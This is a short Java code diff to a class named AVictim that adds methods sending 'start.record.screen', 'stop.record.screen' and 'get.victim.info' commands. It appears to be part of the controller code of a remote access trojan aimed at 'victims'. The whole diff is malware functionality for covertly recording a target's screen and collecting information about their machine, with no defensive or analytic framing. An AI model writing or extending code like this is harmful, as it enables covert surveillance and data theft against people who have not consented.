@@ -56,4 +56,27 @@ public class AVictim extends Victim {
         sendMessage(query);
     }
 
+    public void sendStartRecordScreen(String path, long seconds, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "start.record.screen");
+        query.put("path", path);
+        query.put("seconds", seconds);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    public void sendStopRecordScreen(String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "stop.record.screen");
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    public void sendGetVictimInfo(String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.victim.info");
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
 }
